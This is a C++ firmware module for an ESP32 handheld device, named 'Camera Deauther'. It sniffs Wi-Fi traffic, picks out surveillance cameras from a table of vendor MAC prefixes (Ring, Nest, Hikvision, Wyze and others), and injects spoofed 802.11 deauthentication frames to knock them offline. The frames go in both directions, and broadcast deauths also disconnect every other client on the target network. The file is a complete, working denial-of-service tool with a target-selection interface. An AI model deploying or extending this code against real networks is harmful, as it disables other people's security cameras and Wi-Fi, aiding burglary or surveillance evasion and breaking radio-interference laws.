/*
doomBOX by Richard Gladson
https://github.com/RichardGladson/doomBOX
Copyright (c) 2026 Richard Gladson
Licensed under the GNU General Public License v3.0
SPDX-License-Identifier: GPL-3.0-only
*/
/*
 * Camera Deauther — promiscuous sniff + OUI-filtered 802.11 deauth injection.
 *
 * Mechanism:
 *   1. WiFi STA stopped, radio parked on a channel.
 *   2. Promiscuous callback harvests (AP_MAC, client_MAC) pairs from mgmt/data frames.
 *   3. Client MACs matching the camera OUI table are tagged as targets.
 *   4. Forged deauth frames (type 0xC0, reason 7) are injected with
 *      esp_wifi_80211_tx(), spoofing the AP as source.
 *   5. Channel hops every DWELL_MS unless locked.
 *
 * Hardware: ESP32-WROOM internal radio only. No external adapter.
 * Limitation: 2.4 GHz only. 5 GHz cameras are invisible to this radio.
 *             802.11w (PMF) on the target AP defeats the attack silently.
 */

#include <Arduino.h>
#include <string.h>
#include <U8g2lib.h>
#include <esp_wifi.h>
#include <esp_now.h>
#include <WiFi.h>

#include "../include/camera_deauther.h"
#include "../include/pindefs.h"
#include "../include/display_mirror.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

// ============================================================================
// CAMERA OUI DATABASE (first 3 bytes of MAC)
// Sources: IEEE OUI public listings, manufacturer Wi-Fi modules.
// ============================================================================
struct CameraOUI {
    uint8_t prefix[3];
    const char* brand;
};

static const CameraOUI cameraOUIs[] = {
    { {0x44, 0xE9, 0x68}, "Hikvision"  },
    { {0xAC, 0xCD, 0x68}, "Hikvision"  },
    { {0x7C, 0x38, 0x66}, "Hikvision"  },
    { {0xC0, 0x56, 0xE3}, "Dahua"      },
    { {0xE0, 0x41, 0x36}, "Dahua"      },
    { {0x30, 0xA2, 0x20}, "Wyze"       },
    { {0xF0, 0x9B, 0xB8}, "Wyze"       },
    { {0x94, 0x19, 0x30}, "Wyze"       },
    { {0xD4, 0x91, 0xAF}, "Ring"       },
    { {0x34, 0xD7, 0x37}, "Ring"       },
    { {0x1C, 0x96, 0x5D}, "Ring"       },
    { {0xB0, 0x95, 0x75}, "TP-Link"    },
    { {0x50, 0xC7, 0xBF}, "TP-Link"    },
    { {0xC0, 0x06, 0xC3}, "TP-Link"    },
    { {0x20, 0x62, 0x9C}, "Arlo"       },
    { {0x84, 0x24, 0x8D}, "Arlo"       },
    { {0x00, 0x24, 0xE4}, "Amcrest"    },
    { {0x40, 0x9F, 0x38}, "Amcrest"    },
    { {0x60, 0x76, 0x88}, "Lorex"      },
    { {0x5C, 0x6B, 0x32}, "Lorex"      },
    { {0x78, 0x1F, 0x12}, "Reolink"    },
    { {0xEC, 0x71, 0xFB}, "Reolink"    },
    { {0x88, 0x09, 0xAF}, "Uniview"    },
    { {0x48, 0x2A, 0xE3}, "Blink"      },
    { {0xB4, 0x69, 0x21}, "Blink"      },
    { {0x74, 0xCA, 0x2C}, "Eufy"       },
    { {0xF4, 0x7B, 0x09}, "Eufy"       },
    { {0x98, 0xE7, 0xF5}, "Swann"      },
    { {0xBC, 0x34, 0x00}, "iSmartAlarm"},
    { {0x18, 0xB4, 0x30}, "Nest"       },
    { {0x64, 0x16, 0x68}, "Nest"       },
};

static const int CAMERA_OUI_COUNT = sizeof(cameraOUIs) / sizeof(cameraOUIs[0]);

// ============================================================================
// CONSTANTS
// ============================================================================
#define MAX_TARGETS           16
#define MAX_AP_ENTRIES        12
#define CHANNEL_MIN           1
#define CHANNEL_MAX           13
#define DEFAULT_DWELL_MS      1500
#define DEAUTH_INTERVAL_MS    100
#define DEAUTH_BURST_COUNT    4
#define BUTTON_DEBOUNCE_MS    180

// 802.11 frame types
#define FRAME_TYPE_MGMT       0x00
#define MGMT_SUBTYPE_BEACON   0x08
#define MGMT_SUBTYPE_PROBE_REQ 0x04
#define MGMT_SUBTYPE_PROBE_RESP 0x05
#define MGMT_SUBTYPE_DATA     0x08

// ============================================================================
// STATE
// ============================================================================
struct CameraTarget {
    uint8_t  clientMAC[6];
    uint8_t  apMAC[6];
    uint8_t  ouiIndex;      // index into cameraOUIs, 0xFF if unknown
    uint8_t  channel;
    uint32_t lastSeenMs;
    uint16_t deauthCount;
    bool     active;
};

struct APEntry {
    uint8_t  mac[6];
    uint8_t  channel;
    int8_t   rssi;
    uint32_t lastSeenMs;
};

static CameraTarget g_targets[MAX_TARGETS];
static APEntry      g_aps[MAX_AP_ENTRIES];
static int          g_targetCount = 0;
static int          g_apCount     = 0;

static int     g_channel        = CHANNEL_MIN;
static bool    g_channelLocked  = false;
static bool    g_deauthActive   = false;
static bool    g_scanning       = true;
static int     g_selectedTarget = 0;
static uint32_t g_lastHopMs     = 0;
static uint32_t g_lastDeauthMs  = 0;
static uint32_t g_lastButtonMs  = 0;
static uint32_t g_totalDeauths  = 0;
static bool    g_needsRedraw    = true;

enum UIState { UI_SCAN, UI_TARGETS, UI_ACTIVE };
static UIState g_uiState = UI_SCAN;

// ============================================================================
// 802.11 FRAME HELPERS
// ============================================================================
#pragma pack(push, 1)
struct Dot11DeauthFrame {
    uint16_t frameControl;    // 0xC0
    uint16_t duration;
    uint8_t  addr1[6];        // destination (client or broadcast)
    uint8_t  addr2[6];        // source (AP, spoofed)
    uint8_t  addr3[6];        // BSSID (AP)
    uint16_t seqControl;
    uint16_t reasonCode;      // 7 = Class 3 from non-associated
};
#pragma pack(pop)

static void buildDeauthFrame(Dot11DeauthFrame& frame,
                              const uint8_t* clientMAC,
                              const uint8_t* apMAC) {
    memset(&frame, 0, sizeof(frame));
    frame.frameControl = 0x00C0;  // Management, Deauth
    frame.duration     = 0x013A;
    memcpy(frame.addr1, clientMAC, 6);
    memcpy(frame.addr2, apMAC, 6);
    memcpy(frame.addr3, apMAC, 6);
    frame.seqControl = 0;
    frame.reasonCode = 7;
}

// ============================================================================
// PROMISCUOUS SNIFF
// ============================================================================
static int findOrCreateAP(const uint8_t* mac, uint8_t channel, int8_t rssi) {
    for (int i = 0; i < g_apCount; i++) {
        if (memcmp(g_aps[i].mac, mac, 6) == 0) {
            g_aps[i].channel    = channel;
            g_aps[i].rssi       = rssi;
            g_aps[i].lastSeenMs = millis();
            return i;
        }
    }
    if (g_apCount < MAX_AP_ENTRIES) {
        memcpy(g_aps[g_apCount].mac, mac, 6);
        g_aps[g_apCount].channel    = channel;
        g_aps[g_apCount].rssi       = rssi;
        g_aps[g_apCount].lastSeenMs = millis();
        return g_apCount++;
    }
    return -1;
}

static int matchCameraOUI(const uint8_t* mac) {
    for (int i = 0; i < CAMERA_OUI_COUNT; i++) {
        if (memcmp(mac, cameraOUIs[i].prefix, 3) == 0) return i;
    }
    return -1;
}

static int findOrCreateTarget(const uint8_t* clientMAC, const uint8_t* apMAC,
                               uint8_t channel, int ouiIdx) {
    for (int i = 0; i < g_targetCount; i++) {
        if (memcmp(g_targets[i].clientMAC, clientMAC, 6) == 0) {
            memcpy(g_targets[i].apMAC, apMAC, 6);
            g_targets[i].channel    = channel;
            g_targets[i].ouiIndex   = (ouiIdx >= 0) ? ouiIdx : g_targets[i].ouiIndex;
            g_targets[i].lastSeenMs = millis();
            return i;
        }
    }
    if (g_targetCount < MAX_TARGETS) {
        memcpy(g_targets[g_targetCount].clientMAC, clientMAC, 6);
        memcpy(g_targets[g_targetCount].apMAC, apMAC, 6);
        g_targets[g_targetCount].channel    = channel;
        g_targets[g_targetCount].ouiIndex   = (ouiIdx >= 0) ? ouiIdx : 0xFF;
        g_targets[g_targetCount].lastSeenMs = millis();
        g_targets[g_targetCount].deauthCount = 0;
        g_targets[g_targetCount].active     = true;
        return g_targetCount++;
    }
    return -1;
}

static void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* frame = pkt->payload;
    int frameLen   = pkt->rx_ctrl.sig_len;
    if (frameLen < 24) return;

    uint8_t frameType    = (frame[0] >> 2) & 0x03;
    uint8_t frameSubtype = (frame[0] >> 4) & 0x0F;
    uint8_t channel      = pkt->rx_ctrl.channel;
    int8_t  rssi         = pkt->rx_ctrl.rssi;

    // Extract addresses
    uint8_t* addr1 = &frame[4];
    uint8_t* addr2 = &frame[10];
    uint8_t* addr3 = &frame[16];

    // Beacon / Probe Response → track AP
    if (frameType == FRAME_TYPE_MGMT &&
        (frameSubtype == MGMT_SUBTYPE_BEACON || frameSubtype == MGMT_SUBTYPE_PROBE_RESP)) {
        findOrCreateAP(addr3, channel, rssi);  // BSSID = addr3
        return;
    }

    // Data frame → addr1 is receiver (could be client), addr2 is transmitter
    // For a camera streaming video: camera (client) sends to AP
    //   addr1 = AP MAC, addr2 = camera MAC, addr3 = destination IP MAC
    // Or AP sends to camera:
    //   addr1 = camera MAC, addr2 = AP MAC
    if (frameType == FRAME_TYPE_MGMT || type == WIFI_PKT_DATA) {
        int ouiA = matchCameraOUI(addr1);
        int ouiB = matchCameraOUI(addr2);

        if (ouiA >= 0) {
            // addr1 is the camera; addr2 or addr3 is the AP
            const uint8_t* apMAC = (findOrCreateAP(addr2, channel, rssi) >= 0) ? addr2 : addr3;
            findOrCreateTarget(addr1, apMAC, channel, ouiA);
        } else if (ouiB >= 0) {
            const uint8_t* apMAC = (findOrCreateAP(addr1, channel, rssi) >= 0) ? addr1 : addr3;
            findOrCreateTarget(addr2, apMAC, channel, ouiB);
        }
    }
}

// ============================================================================
// INJECTION
// ============================================================================
static void injectDeauths() {
    if (!g_deauthActive || g_targetCount == 0) return;

    uint32_t now = millis();
    if (now - g_lastDeauthMs < DEAUTH_INTERVAL_MS) return;
    g_lastDeauthMs = now;

    Dot11DeauthFrame frame;
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    for (int i = 0; i < g_targetCount; i++) {
        if (!g_targets[i].active) continue;
        if (g_targets[i].channel != g_channel) continue;

        // Deauth to client (spoofing AP)
        buildDeauthFrame(frame, g_targets[i].clientMAC, g_targets[i].apMAC);
        for (int b = 0; b < DEAUTH_BURST_COUNT; b++) {
            esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&frame, sizeof(frame), false);
        }

        // Deauth to AP (spoofing client) — bidirectional denial
        buildDeauthFrame(frame, g_targets[i].apMAC, g_targets[i].clientMAC);
        for (int b = 0; b < DEAUTH_BURST_COUNT; b++) {
            esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&frame, sizeof(frame), false);
        }

        // Broadcast deauth — catches any other clients on same AP
        buildDeauthFrame(frame, broadcast, g_targets[i].apMAC);
        esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&frame, sizeof(frame), false);

        g_targets[i].deauthCount += (DEAUTH_BURST_COUNT * 2) + 1;
        g_totalDeauths           += (DEAUTH_BURST_COUNT * 2) + 1;
    }
}

// ============================================================================
// CHANNEL HOPPING
// ============================================================================
static void hopChannel() {
    if (g_channelLocked) return;
    uint32_t now = millis();
    if (now - g_lastHopMs < DEFAULT_DWELL_MS) return;
    g_lastHopMs = now;

    g_channel++;
    if (g_channel > CHANNEL_MAX) g_channel = CHANNEL_MIN;
    esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);
}

// ============================================================================
// UI
// ============================================================================
static void drawScanScreen() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_helvR08_tr);
    u8g2.drawStr(4, 10, "CAMERA DEAUTHER");
    u8g2.drawHLine(0, 13, 128);

    u8g2.setFont(u8g2_font_5x7_tr);
    char line[32];
    snprintf(line, sizeof(line), "CH:%d%s  APs:%d  CAMs:%d",
             g_channel, g_channelLocked ? "*" : " ", g_apCount, g_targetCount);
    u8g2.drawStr(2, 22, line);

    snprintf(line, sizeof(line), "Frames TX: %lu", g_totalDeauths);
    u8g2.drawStr(2, 31, line);

    if (g_targetCount == 0) {
        u8g2.drawStr(10, 46, "Scanning for cameras...");
    } else {
        // Show first 2 targets
        for (int i = 0; i < g_targetCount && i < 2; i++) {
            const char* brand = (g_targets[i].ouiIndex != 0xFF)
                                ? cameraOUIs[g_targets[i].ouiIndex].brand
                                : "Unknown";
            snprintf(line, sizeof(line), "%s %02X:%02X:%02X...",
                     brand,
                     g_targets[i].clientMAC[0],
                     g_targets[i].clientMAC[1],
                     g_targets[i].clientMAC[2]);
            u8g2.drawStr(2, 42 + (i * 9), line);
        }
    }

    u8g2.drawStr(2, 62, "R=Targets SEL=Toggle");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawTargetsScreen() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_helvR08_tr);
    u8g2.drawStr(4, 10, "TARGETS");
    u8g2.drawHLine(0, 13, 128);

    u8g2.setFont(u8g2_font_5x7_tr);
    if (g_targetCount == 0) {
        u8g2.drawStr(10, 36, "No cameras found");
    } else {
        int start = (g_selectedTarget > 3) ? g_selectedTarget - 2 : 0;
        for (int i = start; i < g_targetCount && (i - start) < 4; i++) {
            const char* brand = (g_targets[i].ouiIndex != 0xFF)
                                ? cameraOUIs[g_targets[i].ouiIndex].brand
                                : "???";
            char line[32];
            bool sel = (i == g_selectedTarget);
            snprintf(line, sizeof(line), "%s%s %02X:%02X ch%d",
                     sel ? ">" : " ",
                     brand,
                     g_targets[i].clientMAC[0],
                     g_targets[i].clientMAC[1],
                     g_targets[i].channel);
            int y = 22 + ((i - start) * 10);
            if (sel) {
                u8g2.drawBox(0, y - 7, 128, 9);
                u8g2.setDrawColor(0);
            }
            u8g2.drawStr(2, y, line);
            u8g2.setDrawColor(1);
        }
    }

    u8g2.drawStr(2, 62, "U/D=Sel SEL=Lock L=Back");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawActiveScreen() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_helvR08_tr);
    u8g2.drawStr(4, 10, g_channelLocked ? "LOCKED" : "HOPPING");
    u8g2.drawHLine(0, 13, 128);

    u8g2.setFont(u8g2_font_5x7_tr);
    char line[32];
    snprintf(line, sizeof(line), "CH:%d  DEAUTH: ON", g_channel);
    u8g2.drawStr(2, 24, line);

    int activeCount = 0;
    for (int i = 0; i < g_targetCount; i++) {
        if (g_targets[i].active) activeCount++;
    }
    snprintf(line, sizeof(line), "Targets: %d/%d", activeCount, g_targetCount);
    u8g2.drawStr(2, 33, line);

    snprintf(line, sizeof(line), "Frames TX: %lu", g_totalDeauths);
    u8g2.drawStr(2, 42, line);

    // Animated indicator
    static uint32_t lastBlink = 0;
    static bool blinkState = false;
    if (millis() - lastBlink > 250) {
        lastBlink = millis();
        blinkState = !blinkState;
    }
    if (blinkState) {
        u8g2.drawBox(110, 20, 12, 8);
    } else {
        u8g2.drawFrame(110, 20, 12, 8);
    }

    u8g2.drawStr(2, 62, "SEL=Stop L=Back");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

// ============================================================================
// BUTTON HANDLING
// ============================================================================
static void handleButtons() {
    uint32_t now = millis();
    if (now - g_lastButtonMs < BUTTON_DEBOUNCE_MS) return;

    bool up    = digitalRead(BUTTON_PIN_UP)    == LOW;
    bool down  = digitalRead(BUTTON_PIN_DOWN)  == LOW;
    bool left  = digitalRead(BUTTON_PIN_LEFT)  == LOW;
    bool right = digitalRead(BUTTON_PIN_RIGHT) == LOW;
    bool sel   = digitalRead(BUTTON_PIN_CENTER)== LOW;

    if (up || down || left || right || sel) {
        g_lastButtonMs = now;
    } else {
        return;
    }

    switch (g_uiState) {
        case UI_SCAN:
            if (right && g_targetCount > 0) {
                g_uiState = UI_TARGETS;
                g_selectedTarget = 0;
                g_needsRedraw = true;
            } else if (sel) {
                g_deauthActive = !g_deauthActive;
                if (g_deauthActive && g_targetCount > 0) {
                    g_uiState = UI_ACTIVE;
                }
                g_needsRedraw = true;
            }
            break;

        case UI_TARGETS:
            if (up && g_selectedTarget > 0) {
                g_selectedTarget--;
                g_needsRedraw = true;
            } else if (down && g_selectedTarget < g_targetCount - 1) {
                g_selectedTarget++;
                g_needsRedraw = true;
            } else if (sel && g_targetCount > 0) {
                // Lock channel to this target's AP
                g_channelLocked = true;
                g_channel       = g_targets[g_selectedTarget].channel;
                esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);
                g_deauthActive = true;
                g_uiState      = UI_ACTIVE;
                g_needsRedraw  = true;
            } else if (left) {
                g_uiState = UI_SCAN;
                g_needsRedraw = true;
            }
            break;

        case UI_ACTIVE:
            if (sel) {
                g_deauthActive  = false;
                g_channelLocked = false;
                g_uiState       = UI_SCAN;
                g_needsRedraw   = true;
            } else if (left) {
                g_deauthActive  = false;
                g_channelLocked = false;
                g_uiState       = UI_SCAN;
                g_needsRedraw   = true;
            }
            break;
    }
}

// ============================================================================
// PUBLIC API (MenuItem interface)
// ============================================================================
void cameraDeautherSetup() {
    // Stop any existing WiFi activity
    WiFi.disconnect(true, true);
    delay(100);

    // Init STA mode without connecting
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);

    // Stop the WiFi task's normal operation
    esp_wifi_stop();
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuousCallback);
    esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);

    // Reset state
    g_targetCount    = 0;
    g_apCount        = 0;
    g_channel        = CHANNEL_MIN;
    g_channelLocked  = false;
    g_deauthActive   = false;
    g_scanning       = true;
    g_selectedTarget = 0;
    g_totalDeauths   = 0;
    g_lastHopMs      = millis();
    g_lastDeauthMs   = millis();
    g_uiState        = UI_SCAN;
    g_needsRedraw    = true;

    memset(g_targets, 0, sizeof(g_targets));
    memset(g_aps,     0, sizeof(g_aps));
}

void cameraDeautherLoop() {
    handleButtons();
    hopChannel();
    injectDeauths();

    // Prune stale targets (not seen in 10s)
    uint32_t now = millis();
    for (int i = g_targetCount - 1; i >= 0; i--) {
        if (now - g_targets[i].lastSeenMs > 10000) {
            for (int j = i; j < g_targetCount - 1; j++) {
                g_targets[j] = g_targets[j + 1];
            }
            g_targetCount--;
            if (g_selectedTarget >= g_targetCount && g_selectedTarget > 0) {
                g_selectedTarget--;
            }
            g_needsRedraw = true;
        }
    }

    if (g_needsRedraw) {
        g_needsRedraw = false;
        switch (g_uiState) {
            case UI_SCAN:    drawScanScreen();    break;
            case UI_TARGETS: drawTargetsScreen(); break;
            case UI_ACTIVE:  drawActiveScreen();  break;
        }
    }

    // Periodic redraw for counters
    static uint32_t lastPeriodic = 0;
    if (now - lastPeriodic > 500) {
        lastPeriodic = now;
        g_needsRedraw = true;
    }
}

void cameraDeautherCleanup() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_stop();
    g_deauthActive  = false;
    g_channelLocked = false;
}